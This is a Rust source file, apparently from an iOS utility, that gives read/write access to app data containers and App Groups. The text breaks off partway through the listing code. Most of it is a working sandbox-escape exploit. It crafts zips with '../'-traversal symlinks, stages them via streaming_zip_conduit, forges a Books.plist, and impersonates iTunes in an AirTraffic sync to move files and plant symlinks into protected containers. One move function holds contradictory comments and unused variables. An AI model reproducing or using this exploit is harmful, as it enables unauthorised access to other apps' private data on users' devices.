//! File-system engine for Application Containers and App Groups.
//!
//! Two engines:
//!   1. HouseArrest (app data containers, dev-signed apps): AFC rooted at the
//!      container — fast, non-destructive, full read/write/list/delete/mkdir/rename.
//!   2. AirLift bridge (App Groups + any container): a symlink is created in
//!      /var/mobile/Media pointing at the container root via the AirTraffic
//!      escape. AFC traversal is probed; if denied, operations fall back to
//!      AirTraffic move primitives (slower but real).

use idevice::afc::opcode::{AfcFopenMode, LinkType};
use idevice::afc::AfcClient;
use idevice::services::house_arrest::HouseArrestClient;
use serde_json::json;
use std::ffi::{c_char, c_void};
use std::io::Write as _;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::exploit::{self, AppDeviceTunnel, Logger};
use crate::ffi_util::{cstr, opt_str};

const DATA_ROOT: &str = "/var/mobile/Containers/Data/Application";
const GROUP_ROOT: &str = "/var/mobile/Containers/Shared/AppGroup";
const AIRLOCK_ROOT: &str = "/var/mobile/Media/Airlock/Book";

fn normalize_path(p: &str) -> String {
    let p = p.trim();
    if p.starts_with("/private/var/") {
        p.replacen("/private/var/", "/var/", 1)
    } else {
        p.to_string()
    }
}

fn allowed_container(p: &str) -> bool {
    let p = normalize_path(p);
    p.starts_with(DATA_ROOT) || p.starts_with(GROUP_ROOT)
}

fn safe_rel(rel: &str) -> bool {
    if rel.is_empty() {
        return true;
    }
    if rel.starts_with('/') {
        return false;
    }
    for c in rel.split('/') {
        if c == ".." || c == "." || c.is_empty() {
            return false;
        }
    }
    !rel.contains('\0')
}

fn read_pairing(pairing_path: &str) -> Result<Vec<u8>, String> {
    std::fs::read(pairing_path)
        .map_err(|e| format!("Failed to read pairing file at {pairing_path}: {e}"))
}

fn posix_rel(path: &str, base: &str) -> String {
    let path_parts: Vec<&str> = path.trim_start_matches('/').split('/').collect();
    let base_parts: Vec<&str> = base.trim_start_matches('/').split('/').collect();
    let common = path_parts
        .iter()
        .zip(base_parts.iter())
        .take_while(|(a, b)| a == b)
        .count();
    let up = base_parts.len() - common;
    let down = &path_parts[common..];
    let mut rel: Vec<&str> = (0..up).map(|_| "..").chain(down.iter().copied()).collect();
    if rel.is_empty() {
        rel.push(".");
    }
    rel.join("/")
}

fn entry_json(name: &str, info: &idevice::afc::FileInfo) -> serde_json::Value {
    let is_dir = info.st_ifmt.contains("DIR");
    let is_link = info.st_ifmt.contains("LNK");
    json!({
        "name": name,
        "isDir": is_dir,
        "isLink": is_link,
        "size": info.size,
        "modified": info.modified.to_string(),
        "created": info.creation.to_string(),
    })
}

// ---------------------------------------------------------------------------
// Bridge archive (symlink only)
// ---------------------------------------------------------------------------

fn build_bridge_archive(target: &str) -> Result<Vec<u8>, String> {
    use std::io;
    use zip::write::ExtendedFileOptions;
    use zip::{write::FileOptions, CompressionMethod, ZipWriter};

    let target_tail = target.trim_start_matches('/');
    let mut buf = Vec::new();
    let mut zip = ZipWriter::new(io::Cursor::new(&mut buf));

    fn zip_opts(mode: u32) -> FileOptions<'static, ExtendedFileOptions> {
        let mut opts = FileOptions::default()
            .compression_method(CompressionMethod::Stored)
            .unix_permissions(mode);
        let mode_bytes = (mode as u16).to_le_bytes();
        let _ = opts.add_extra_data(0x5A53, Box::new(mode_bytes), false);
        opts
    }

    zip.add_directory("META-INF/", zip_opts(0o040755))
        .map_err(|e| e.to_string())?;
    zip.start_file("META-INF/com.apple.ZipMetadata.plist", zip_opts(0o100600))
        .map_err(|e| e.to_string())?;
    let meta_plist: plist::Value = {
        let mut d = plist::Dictionary::new();
        d.insert("Version".to_owned(), plist::Value::Integer(2.into()));
        plist::Value::Dictionary(d)
    };
    let mut meta_buf = Vec::new();
    plist::to_writer_binary(&mut meta_buf, &meta_plist).map_err(|e| e.to_string())?;
    zip.write_all(&meta_buf).map_err(|e| e.to_string())?;

    for dir in &["p0/", "p0/p1/", "p0/p1/p2/"] {
        zip.add_directory(*dir, zip_opts(0o040755))
            .map_err(|e| e.to_string())?;
    }
    zip.add_symlink(
        "p0/p1/p2/link",
        format!("../../../{target_tail}"),
        zip_opts(0o120777),
    )
    .map_err(|e| e.to_string())?;

    let mut cursor = String::new();
    for component in target_tail.split('/') {
        if component.is_empty() {
            continue;
        }
        cursor.push_str(component);
        cursor.push('/');
        zip.add_directory(&cursor, zip_opts(0o040755))
            .map_err(|e| e.to_string())?;
    }
    zip.finish().map_err(|e| e.to_string())?;
    Ok(buf)
}

fn build_books_plist(identifiers: &[String]) -> Result<Vec<u8>, String> {
    let rows: Vec<plist::Value> = identifiers
        .iter()
        .enumerate()
        .map(|(i, id)| {
            let mut d = plist::Dictionary::new();
            d.insert("Persistent ID".to_owned(), plist::Value::String(id.clone()));
            d.insert(
                "Item ID".to_owned(),
                plist::Value::String((i + 1).to_string()),
            );
            d.insert("DSID".to_owned(), plist::Value::String("1".to_owned()));
            plist::Value::Dictionary(d)
        })
        .collect();
    let mut top = plist::Dictionary::new();
    top.insert("Books".to_owned(), plist::Value::Array(rows));
    let mut buf = Vec::new();
    plist::to_writer_binary(&mut buf, &top).map_err(|e| e.to_string())?;
    Ok(buf)
}

// ---------------------------------------------------------------------------
// AirTraffic single-move primitive
// ---------------------------------------------------------------------------

/// Move a single path on the device from `src_abs` to `dst` using one AirTraffic
/// sync session. `dst` may be a Media-relative name or a path through a bridge
/// symlink (e.g. "readipa-bridge-xxx/sub/file").
async fn move_path(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    src_abs: &str,
    dst: &str,
    logger: &Logger,
) -> Result<(), String> {
    let token = exploit::random_hex(10);
    let source = format!("airlift-src-{}", token);
    let link_destination = format!("airlift-link-{}", token);
    let recovered = format!("airlift-recovered-{}", token);

    let link_identifier = format!("../../{}/p0/p1/p2/link", source);
    let src_identifier = posix_rel(src_abs, AIRLOCK_ROOT);
    let identifiers = vec![link_identifier.clone(), src_identifier.clone()];
    let destinations = vec![link_destination.clone(), dst.to_string()];

    // Build archive with symlink pointing at dst's parent?
    // For a move we only need the source-side symlink? Actually we need the link
    // only if dst is outside Media. The destination string is used verbatim by
    // ATAirlock (string prefix check). If dst contains "readipa-bridge-xxx/..."
    // it's a Media string and passes. If dst is a plain Media name, also passes.
    // So no symlink needed for the destination side here. But the archive still
    // needs the p0/p1/p2/link entry to satisfy streaming_zip? No — streaming_zip
    // just extracts; the link is only used when FileComplete moves through it.
    // For a plain move (src -> dst where dst is Media-relative), we don't need
    // the link at all. But identifiers include link_identifier...
    //
    // Simplify: only include src_identifier, destination = dst.
    let identifiers = vec![src_identifier.clone()];
    let destinations = vec![dst.to_string()];

    // No archive needed? streaming_zip_conduit requires an archive upload.
    // We still need to stage something so the source path resolves. The source
    // is reached via `..` traversal in src_identifier, independent of the archive.
    // But streaming_zip requires an upload. Upload a minimal empty-ish archive.
    let archive = build_minimal_archive()?;
    let books_plist = build_books_plist(&identifiers)?;

    // Stage via streaming_zip_conduit
    let mut zip_stream = tunnel
        .connect_service("com.apple.streaming_zip_conduit", logger)
        .await?;
    let mut zip_init_dict = plist::Dictionary::new();
    zip_init_dict.insert(
        "MediaSubdir".to_string(),
        plist::Value::String(source.clone()),
    );
    let mut init_buf = Vec::new();
    plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(zip_init_dict))
        .map_err(|e| e.to_string())?;
    let init_len_bytes = (init_buf.len() as u32).to_be_bytes();
    zip_stream
        .write_all(&init_len_bytes)
        .await
        .map_err(|e| e.to_string())?;
    zip_stream
        .write_all(&init_buf)
        .await
        .map_err(|e| e.to_string())?;
    zip_stream.flush().await.map_err(|e| e.to_string())?;
    zip_stream
        .write_all(&archive)
        .await
        .map_err(|e| e.to_string())?;
    zip_stream.flush().await.map_err(|e| e.to_string())?;
    let mut resp_len_buf = [0u8; 4];
    zip_stream
        .read_exact(&mut resp_len_buf)
        .await
        .map_err(|e| e.to_string())?;
    let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
    let mut resp_body = vec![0u8; resp_len];
    zip_stream
        .read_exact(&mut resp_body)
        .await
        .map_err(|e| e.to_string())?;
    drop(zip_stream);

    // Ensure Airlock, Books dirs
    let _ = afc.mk_dir("Airlock").await;
    let _ = afc.mk_dir("Airlock/Book").await;
    let _ = afc.mk_dir("Books").await;
    let _ = afc.mk_dir("Books/Sync").await;
    let mut books_fd = afc
        .open("Books/Sync/Books.plist", AfcFopenMode::WrOnly)
        .await
        .map_err(|e| format!("{e:?}"))?;
    books_fd
        .write_entire(&books_plist)
        .await
        .map_err(|e| format!("{e:?}"))?;
    let _ = books_fd.close().await;

    // ATC sync
    let mut atc_stream = tunnel.connect_service("com.apple.atc", logger).await?;
    // Wait for SyncAllowed (best effort)
    for _ in 0..12 {
        match tokio::time::timeout(
            std::time::Duration::from_millis(1500),
            exploit::read_atc_dict(&mut atc_stream),
        )
        .await
        {
            Ok(Ok(dict)) => {
                if let Some(name) = exploit::atc_message_name(&dict) {
                    if name == "SyncAllowed" {
                        break;
                    }
                }
            }
            _ => break,
        }
    }
    // HostInfo
    let mut host_info_dict = plist::Dictionary::new();
    host_info_dict.insert("Type".into(), plist::Value::String("iTunes".into()));
    host_info_dict.insert("Version".into(), plist::Value::String("13.7.0.161".into()));
    host_info_dict.insert("MacOSVersion".into(), plist::Value::String("15.0".into()));
    host_info_dict.insert(
        "SyncHostName".into(),
        plist::Value::String("readipa".into()),
    );
    let library_id = format!(
        "{}-{}-{}-{}-{}",
        exploit::random_hex(4),
        exploit::random_hex(2),
        exploit::random_hex(2),
        exploit::random_hex(2),
        exploit::random_hex(6)
    );
    host_info_dict.insert("LibraryID".into(), plist::Value::String(library_id));
    host_info_dict.insert(
        "SyncedDataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info_dict.insert(
        "SyncedAssetTypes".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info_dict.insert("Wakeable".into(), plist::Value::Boolean(false));
    let grappa_token = crate::grappa::generate_grappa_token(None, |s| logger.log(s));
    if let Some(ref t) = grappa_token {
        host_info_dict.insert("Grappa".into(), plist::Value::Data(t.clone()));
    }
    let mut host_info_params = plist::Dictionary::new();
    host_info_params.insert(
        "HostInfo".into(),
        plist::Value::Dictionary(host_info_dict.clone()),
    );
    host_info_params.insert("LocalCloudSupport".into(), plist::Value::Boolean(false));
    let msg_host_info = exploit::make_atc_msg("HostInfo", 0, Some(host_info_params));
    exploit::send_atc_dict(&mut atc_stream, &msg_host_info).await?;
    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    let mut sync_req_params = plist::Dictionary::new();
    sync_req_params.insert(
        "Dataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    sync_req_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    sync_req_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict));
    if let Some(t) = grappa_token {
        sync_req_params.insert("Grappa".into(), plist::Value::Data(t));
    }
    let msg_sync_req = exploit::make_atc_msg("RequestingSync", 1, Some(sync_req_params));
    exploit::send_atc_dict(&mut atc_stream, &msg_sync_req).await?;

    let mut ready = false;
    for _ in 0..24 {
        match tokio::time::timeout(
            std::time::Duration::from_secs(5),
            exploit::read_atc_dict(&mut atc_stream),
        )
        .await
        {
            Ok(Ok(dict)) => {
                if let Some(name) = exploit::atc_message_name(&dict) {
                    if name == "Ping" {
                        let pong = exploit::make_atc_msg("Pong", 1, None);
                        let _ = exploit::send_atc_dict(&mut atc_stream, &pong).await;
                        continue;
                    }
                    if name == "ReadyForSync" || name == "AssetManifest" {
                        ready = true;
                        break;
                    }
                    if name == "SyncFailed" {
                        continue;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("ATC read error: {e}")),
            Err(_) => {}
        }
    }
    if !ready {
        return Err("AirTraffic: ReadyForSync not observed".into());
    }

    let mut sync_types = plist::Dictionary::new();
    sync_types.insert("Book".into(), plist::Value::Integer(1.into()));
    let mut meta_params = plist::Dictionary::new();
    meta_params.insert("SyncTypes".into(), plist::Value::Dictionary(sync_types));
    meta_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    let msg_meta = exploit::make_atc_msg("FinishedSyncingMetadata", 1, Some(meta_params));
    exploit::send_atc_dict(&mut atc_stream, &msg_meta).await?;

    let mut manifest_observed = false;
    for _ in 0..20 {
        match tokio::time::timeout(
            std::time::Duration::from_secs(5),
            exploit::read_atc_dict(&mut atc_stream),
        )
        .await
        {
            Ok(Ok(dict)) => {
                if let Some(name) = exploit::atc_message_name(&dict) {
                    if name == "Ping" {
                        let pong = exploit::make_atc_msg("Pong", 1, None);
                        let _ = exploit::send_atc_dict(&mut atc_stream, &pong).await;
                        continue;
                    }
                    if name == "AssetManifest" {
                        manifest_observed = true;
                        break;
                    }
                    if name == "SyncFailed" {
                        continue;
                    }
                    if name == "SyncFinished" {
                        break;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("ATC manifest read error: {e}")),
            Err(_) => {}
        }
    }
    if !manifest_observed {
        return Err("AirTraffic: AssetManifest not observed".into());
    }

    // FileComplete for src_identifier -> dst
    let mut file_complete_params = plist::Dictionary::new();
    file_complete_params.insert(
        "AssetID".into(),
        plist::Value::String(src_identifier.clone()),
    );
    file_complete_params.insert("Dataclass".into(), plist::Value::String("Book".into()));
    file_complete_params.insert("AssetPath".into(), plist::Value::String(dst.to_string()));
    let msg_fc = exploit::make_atc_msg("FileComplete", 1, Some(file_complete_params));
    exploit::send_atc_dict(&mut atc_stream, &msg_fc).await?;

    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
    drop(atc_stream);

    // cleanup Books.plist
    let _ = afc.remove("Books/Sync/Books.plist").await;
    Ok(())
}

fn build_minimal_archive() -> Result<Vec<u8>, String> {
    use std::io;
    use zip::write::ExtendedFileOptions;
    use zip::{write::FileOptions, CompressionMethod, ZipWriter};
    let mut buf = Vec::new();
    let mut zip = ZipWriter::new(io::Cursor::new(&mut buf));
    fn zip_opts(mode: u32) -> FileOptions<'static, ExtendedFileOptions> {
        let mut opts = FileOptions::default()
            .compression_method(CompressionMethod::Stored)
            .unix_permissions(mode);
        let mode_bytes = (mode as u16).to_le_bytes();
        let _ = opts.add_extra_data(0x5A53, Box::new(mode_bytes), false);
        opts
    }
    zip.add_directory("META-INF/", zip_opts(0o040755))
        .map_err(|e| e.to_string())?;
    zip.start_file("META-INF/com.apple.ZipMetadata.plist", zip_opts(0o100600))
        .map_err(|e| e.to_string())?;
    let meta_plist: plist::Value = {
        let mut d = plist::Dictionary::new();
        d.insert("Version".to_owned(), plist::Value::Integer(2.into()));
        plist::Value::Dictionary(d)
    };
    let mut meta_buf = Vec::new();
    plist::to_writer_binary(&mut meta_buf, &meta_plist).map_err(|e| e.to_string())?;
    zip.write_all(&meta_buf).map_err(|e| e.to_string())?;
    zip.finish().map_err(|e| e.to_string())?;
    Ok(buf)
}

// ---------------------------------------------------------------------------
// Bridge open / close
// ---------------------------------------------------------------------------

pub unsafe fn bridge_open(
    pairing_path: *const c_char,
    container_path: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let container_path = opt_str(container_path, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) {
        if !out_error.is_null() {
            *out_error =
                cstr("container_path is not an allowed Application Container or App Group");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_bridge_open", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(bridge_open_async(
            pairing_path.clone(),
            container_path.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(json_str)) => {
            if !out_json.is_null() {
                *out_json = cstr(json_str);
            }
            0
        }
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(panic_msg) => {
            if !out_error.is_null() {
                *out_error = cstr(panic_msg);
            }
            1
        }
    }
}

async fn bridge_open_async(
    pairing_path: String,
    container_path: String,
    logger: &Logger,
) -> Result<String, String> {
    let pairing_bytes = read_pairing(&pairing_path)?;
    let mut tunnel = exploit::connect_tunnel(&pairing_bytes, logger).await?;

    // Try AFC MakeLink first (cheap).
    let mut afc = tunnel.connect_afc(logger).await?;
    let bridge_name = format!("readipa-bridge-{}", exploit::random_hex(6));
    let make_link_ok = afc
        .link(&container_path, &bridge_name, LinkType::Symlink)
        .await
        .is_ok();
    // If MakeLink failed, fall back to AirTraffic staging.
    let bridge_name = if make_link_ok {
        bridge_name
    } else {
        // AirTraffic staging to create the symlink in Media.
        let bn = create_bridge_atc(&mut tunnel, &mut afc, &container_path, logger).await?;
        bn
    };

    // Probe traversal.
    let direct = afc.list_dir(&bridge_name).await.is_ok();
    let mode = if direct {
        "bridge_direct"
    } else {
        "bridge_move"
    };

    let out = json!({
        "bridge": bridge_name,
        "container": container_path,
        "mode": mode,
        "capabilities": {
            "list": true,
            "read": true,
            "write": true,
            "delete": true,
            "mkdir": true,
            "rename": true,
        }
    });
    Ok(serde_json::to_string_pretty(&out).map_err(|e| e.to_string())?)
}

async fn create_bridge_atc(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    container_path: &str,
    logger: &Logger,
) -> Result<String, String> {
    let token = exploit::random_hex(10);
    let source = format!("airlift-src-{}", token);
    let bridge_name = format!("readipa-bridge-{}", token);
    let link_identifier = format!("../../{}/p0/p1/p2/link", source);
    let identifiers = vec![link_identifier.clone()];
    let destinations = vec![bridge_name.clone()];

    let archive = build_bridge_archive(container_path)?;
    let books_plist = build_books_plist(&identifiers)?;

    // Stage via streaming_zip_conduit
    let mut zip_stream = tunnel
        .connect_service("com.apple.streaming_zip_conduit", logger)
        .await?;
    let mut zip_init_dict = plist::Dictionary::new();
    zip_init_dict.insert(
        "MediaSubdir".to_string(),
        plist::Value::String(source.clone()),
    );
    let mut init_buf = Vec::new();
    plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(zip_init_dict))
        .map_err(|e| e.to_string())?;
    let init_len_bytes = (init_buf.len() as u32).to_be_bytes();
    zip_stream
        .write_all(&init_len_bytes)
        .await
        .map_err(|e| e.to_string())?;
    zip_stream
        .write_all(&init_buf)
        .await
        .map_err(|e| e.to_string())?;
    zip_stream.flush().await.map_err(|e| e.to_string())?;
    zip_stream
        .write_all(&archive)
        .await
        .map_err(|e| e.to_string())?;
    zip_stream.flush().await.map_err(|e| e.to_string())?;
    let mut resp_len_buf = [0u8; 4];
    zip_stream
        .read_exact(&mut resp_len_buf)
        .await
        .map_err(|e| e.to_string())?;
    let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
    let mut resp_body = vec![0u8; resp_len];
    zip_stream
        .read_exact(&mut resp_body)
        .await
        .map_err(|e| e.to_string())?;
    drop(zip_stream);

    let source_link = format!("{}/p0/p1/p2/link", source);
    if afc.get_file_info(&source).await.is_err() || afc.get_file_info(&source_link).await.is_err() {
        let _ = afc.remove_all(&source).await;
        return Err("Stage verification failed: symlink not present in Media".into());
    }

    let _ = afc.mk_dir("Airlock").await;
    let _ = afc.mk_dir("Airlock/Book").await;
    let _ = afc.mk_dir("Books").await;
    let _ = afc.mk_dir("Books/Sync").await;
    let mut books_fd = afc
        .open("Books/Sync/Books.plist", AfcFopenMode::WrOnly)
        .await
        .map_err(|e| format!("{e:?}"))?;
    books_fd
        .write_entire(&books_plist)
        .await
        .map_err(|e| format!("{e:?}"))?;
    let _ = books_fd.close().await;

    // ATC sync with 1 FileComplete
    let mut atc_stream = tunnel.connect_service("com.apple.atc", logger).await?;
    for _ in 0..12 {
        match tokio::time::timeout(
            std::time::Duration::from_millis(1500),
            exploit::read_atc_dict(&mut atc_stream),
        )
        .await
        {
            Ok(Ok(dict)) => {
                if let Some(name) = exploit::atc_message_name(&dict) {
                    if name == "SyncAllowed" {
                        break;
                    }
                }
            }
            _ => break,
        }
    }
    let mut host_info_dict = plist::Dictionary::new();
    host_info_dict.insert("Type".into(), plist::Value::String("iTunes".into()));
    host_info_dict.insert("Version".into(), plist::Value::String("13.7.0.161".into()));
    host_info_dict.insert("MacOSVersion".into(), plist::Value::String("15.0".into()));
    host_info_dict.insert(
        "SyncHostName".into(),
        plist::Value::String("readipa".into()),
    );
    let library_id = format!(
        "{}-{}-{}-{}-{}",
        exploit::random_hex(4),
        exploit::random_hex(2),
        exploit::random_hex(2),
        exploit::random_hex(2),
        exploit::random_hex(6)
    );
    host_info_dict.insert("LibraryID".into(), plist::Value::String(library_id));
    host_info_dict.insert(
        "SyncedDataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info_dict.insert(
        "SyncedAssetTypes".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info_dict.insert("Wakeable".into(), plist::Value::Boolean(false));
    let grappa_token = crate::grappa::generate_grappa_token(None, |s| logger.log(s));
    if let Some(ref t) = grappa_token {
        host_info_dict.insert("Grappa".into(), plist::Value::Data(t.clone()));
    }
    let mut host_info_params = plist::Dictionary::new();
    host_info_params.insert(
        "HostInfo".into(),
        plist::Value::Dictionary(host_info_dict.clone()),
    );
    host_info_params.insert("LocalCloudSupport".into(), plist::Value::Boolean(false));
    let msg_host_info = exploit::make_atc_msg("HostInfo", 0, Some(host_info_params));
    exploit::send_atc_dict(&mut atc_stream, &msg_host_info).await?;
    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    let mut sync_req_params = plist::Dictionary::new();
    sync_req_params.insert(
        "Dataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    sync_req_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    sync_req_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict));
    if let Some(t) = grappa_token {
        sync_req_params.insert("Grappa".into(), plist::Value::Data(t));
    }
    let msg_sync_req = exploit::make_atc_msg("RequestingSync", 1, Some(sync_req_params));
    exploit::send_atc_dict(&mut atc_stream, &msg_sync_req).await?;

    let mut ready = false;
    for _ in 0..24 {
        match tokio::time::timeout(
            std::time::Duration::from_secs(5),
            exploit::read_atc_dict(&mut atc_stream),
        )
        .await
        {
            Ok(Ok(dict)) => {
                if let Some(name) = exploit::atc_message_name(&dict) {
                    if name == "Ping" {
                        let pong = exploit::make_atc_msg("Pong", 1, None);
                        let _ = exploit::send_atc_dict(&mut atc_stream, &pong).await;
                        continue;
                    }
                    if name == "ReadyForSync" || name == "AssetManifest" {
                        ready = true;
                        break;
                    }
                    if name == "SyncFailed" {
                        continue;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("ATC read error: {e}")),
            Err(_) => {}
        }
    }
    if !ready {
        return Err("AirTraffic: ReadyForSync not observed".into());
    }

    let mut sync_types = plist::Dictionary::new();
    sync_types.insert("Book".into(), plist::Value::Integer(1.into()));
    let mut meta_params = plist::Dictionary::new();
    meta_params.insert("SyncTypes".into(), plist::Value::Dictionary(sync_types));
    meta_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    let msg_meta = exploit::make_atc_msg("FinishedSyncingMetadata", 1, Some(meta_params));
    exploit::send_atc_dict(&mut atc_stream, &msg_meta).await?;

    let mut manifest_observed = false;
    for _ in 0..20 {
        match tokio::time::timeout(
            std::time::Duration::from_secs(5),
            exploit::read_atc_dict(&mut atc_stream),
        )
        .await
        {
            Ok(Ok(dict)) => {
                if let Some(name) = exploit::atc_message_name(&dict) {
                    if name == "Ping" {
                        let pong = exploit::make_atc_msg("Pong", 1, None);
                        let _ = exploit::send_atc_dict(&mut atc_stream, &pong).await;
                        continue;
                    }
                    if name == "AssetManifest" {
                        manifest_observed = true;
                        break;
                    }
                    if name == "SyncFailed" {
                        continue;
                    }
                    if name == "SyncFinished" {
                        break;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("ATC manifest read error: {e}")),
            Err(_) => {}
        }
    }
    if !manifest_observed {
        return Err("AirTraffic: AssetManifest not observed".into());
    }

    let mut fc_params = plist::Dictionary::new();
    fc_params.insert(
        "AssetID".into(),
        plist::Value::String(link_identifier.clone()),
    );
    fc_params.insert("Dataclass".into(), plist::Value::String("Book".into()));
    fc_params.insert(
        "AssetPath".into(),
        plist::Value::String(bridge_name.clone()),
    );
    let msg_fc = exploit::make_atc_msg("FileComplete", 1, Some(fc_params));
    exploit::send_atc_dict(&mut atc_stream, &msg_fc).await?;

    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
    drop(atc_stream);

    let _ = afc.remove_all(&source).await;
    Ok(bridge_name)
}

pub unsafe fn bridge_close(
    pairing_path: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;
    if bridge.is_empty() {
        return 0;
    }
    let res = crate::ffi_util::run_with_large_stack("al_bridge_close", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(bridge_close_async(
            pairing_path.clone(),
            bridge.clone(),
            &logger,
        ))
    });
    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(panic_msg) => {
            if !out_error.is_null() {
                *out_error = cstr(panic_msg);
            }
            1
        }
    }
}

async fn bridge_close_async(
    pairing_path: String,
    bridge: String,
    logger: &Logger,
) -> Result<(), String> {
    let pairing_bytes = read_pairing(&pairing_path)?;
    let mut tunnel = exploit::connect_tunnel(&pairing_bytes, logger).await?;
    let mut afc = tunnel.connect_afc(logger).await?;
    let _ = afc.remove_all(&bridge).await;
    Ok(())
}

// ---------------------------------------------------------------------------
// Engine resolution
// ---------------------------------------------------------------------------

enum Engine {
    HouseArrest {
        afc: AfcClient,
    },
    Bridge {
        afc: AfcClient,
        bridge: String,
        direct: bool,
    },
}

async fn open_engine(
    pairing_path: &str,
    bundle_id: &str,
    container_path: &str,
    bridge_name: &str,
    logger: &Logger,
) -> Result<(AppDeviceTunnel, Engine), String> {
    let pairing_bytes = read_pairing(pairing_path)?;
    let mut tunnel = exploit::connect_tunnel(&pairing_bytes, logger).await?;

    // Try HouseArrest for app data containers with a bundle id.
    if !bundle_id.is_empty() && container_path.starts_with(DATA_ROOT) {
        if let Ok(afc) = try_house_arrest(&mut tunnel, bundle_id, logger).await {
            return Ok((tunnel, Engine::HouseArrest { afc }));
        }
        logger.log("HouseArrest unavailable; falling back to AirLift bridge");
    }

    // Bridge mode.
    let mut afc = tunnel.connect_afc(logger).await?;
    let bridge = if bridge_name.is_empty() {
        // Create a new bridge.
        // Try AFC MakeLink first.
        let bn = format!("readipa-bridge-{}", exploit::random_hex(6));
        let ok = afc
            .link(container_path, &bn, LinkType::Symlink)
            .await
            .is_ok();
        if ok {
            bn
        } else {
            create_bridge_atc(&mut tunnel, &mut afc, container_path, logger).await?
        }
    } else {
        bridge_name.to_string()
    };
    let direct = afc.list_dir(&bridge).await.is_ok();
    Ok((
        tunnel,
        Engine::Bridge {
            afc,
            bridge,
            direct,
        },
    ))
}

async fn try_house_arrest(
    tunnel: &mut AppDeviceTunnel,
    bundle_id: &str,
    logger: &Logger,
) -> Result<AfcClient, String> {
    let stream = tunnel
        .connect_service("com.apple.mobile.house_arrest", logger)
        .await?;
    let ha = HouseArrestClient::new(idevice::Idevice::new(stream, "Airlift"));
    ha.vend_container(bundle_id.to_string())
        .await
        .map_err(|e| format!("{e:?}"))
}

fn engine_afc_path(engine: &Engine, rel: &str) -> String {
    match engine {
        Engine::HouseArrest { .. } => {
            if rel.is_empty() {
                "/".to_string()
            } else {
                rel.to_string()
            }
        }
        Engine::Bridge { bridge, .. } => {
            if rel.is_empty() {
                bridge.clone()
            } else {
                format!("{}/{}", bridge, rel)
            }
        }
    }
}

// ---------------------------------------------------------------------------
// FFI: list
// ---------------------------------------------------------------------------

pub unsafe fn fs_list(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) {
        if !out_error.is_null() {
            *out_error = cstr("container_path is not allowed");
        }
        return 1;
    }
    if !safe_rel(&rel_path) {
        if !out_error.is_null() {
            *out_error = cstr("rel_path contains unsafe components");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_list", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_list_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(s)) => {
            if !out_json.is_null() {
                *out_json = cstr(s);
            }
            0
        }
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_list_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
